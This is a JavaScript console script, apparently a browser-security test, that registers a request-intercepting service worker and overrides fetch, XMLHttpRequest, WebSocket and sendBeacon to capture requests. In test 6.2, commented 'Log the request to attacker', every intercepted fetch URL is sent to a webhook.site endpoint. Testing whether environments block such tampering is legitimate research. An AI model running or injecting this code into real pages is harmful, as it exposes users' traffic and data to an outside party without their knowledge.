// =============================================================
// TEST 06: Network Interception — Service Workers, Request Tampering
// =============================================================

// --- Test 6.1: Register a Service Worker from console ---
// Requires a SW file — we create one from a blob
try {
    var swCode = `
        self.addEventListener('fetch', function(event) {
            // Log every request
            console.log('[SW] Intercepted:', event.request.url);
            // Could modify requests, redirect, inject content
            event.respondWith(fetch(event.request));
        });
        self.addEventListener('install', function() { self.skipWaiting(); });
        self.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); });
    `;
    var swBlob = new Blob([swCode], {type: 'application/javascript'});
    var swUrl = URL.createObjectURL(swBlob);
    navigator.serviceWorker.register(swUrl, {scope: '/'})
        .then(function(reg) { console.log('[TEST 6.1] Service Worker REGISTERED:', reg.scope); })
        .catch(function(e) { console.log('[TEST 6.1] SW registration BLOCKED:', e.message); });
} catch(e) { console.log('[TEST 6.1] SW not available:', e.message); }

// --- Test 6.2: Override fetch globally ---
var originalFetch = window.fetch;
window.fetch = function() {
    console.log('[TEST 6.2] INTERCEPTED fetch:', arguments[0]);
    // Log the request to attacker
    navigator.sendBeacon('https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef', JSON.stringify({cat:'devtools',test:'fetch-intercept',intercepted_url: arguments[0].toString(), time: Date.now()}));
    return originalFetch.apply(this, arguments);
};
console.log('[TEST 6.2] window.fetch OVERRIDDEN — all fetch calls now logged');

// --- Test 6.3: Override XMLHttpRequest ---
var origOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
    console.log('[TEST 6.3] INTERCEPTED XHR:', method, url);
    this._interceptedUrl = url;
    return origOpen.apply(this, arguments);
};
var origSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function(body) {
    if (body) console.log('[TEST 6.3] XHR body:', typeof body === 'string' ? body.substring(0, 200) : '(non-string)');
    return origSend.apply(this, arguments);
};
console.log('[TEST 6.3] XMLHttpRequest OVERRIDDEN — all XHR calls now logged');

// --- Test 6.4: Override WebSocket ---
var OrigWS = window.WebSocket;
window.WebSocket = function(url, protocols) {
    console.log('[TEST 6.4] INTERCEPTED WebSocket:', url);
    var ws = new OrigWS(url, protocols);
    var origSend = ws.send.bind(ws);
    ws.send = function(data) {
        console.log('[TEST 6.4] WS send:', typeof data === 'string' ? data.substring(0, 200) : '(binary)');
        return origSend(data);
    };
    return ws;
};
console.log('[TEST 6.4] WebSocket OVERRIDDEN');

// --- Test 6.5: Override navigator.sendBeacon ---
var origBeacon = navigator.sendBeacon;
navigator.sendBeacon = function(url, data) {
    console.log('[TEST 6.5] INTERCEPTED sendBeacon:', url, data);
    return origBeacon.apply(navigator, arguments);
};
console.log('[TEST 6.5] navigator.sendBeacon OVERRIDDEN');

// --- Test 6.6: Check existing Service Workers ---
navigator.serviceWorker.getRegistrations().then(function(regs) {
    console.log('[TEST 6.6] Active Service Workers:', regs.length);
    regs.forEach(function(r) { console.log('  Scope:', r.scope, 'Active:', !!r.active); });
}).catch(function(e) { console.log('[TEST 6.6]', e.message); });
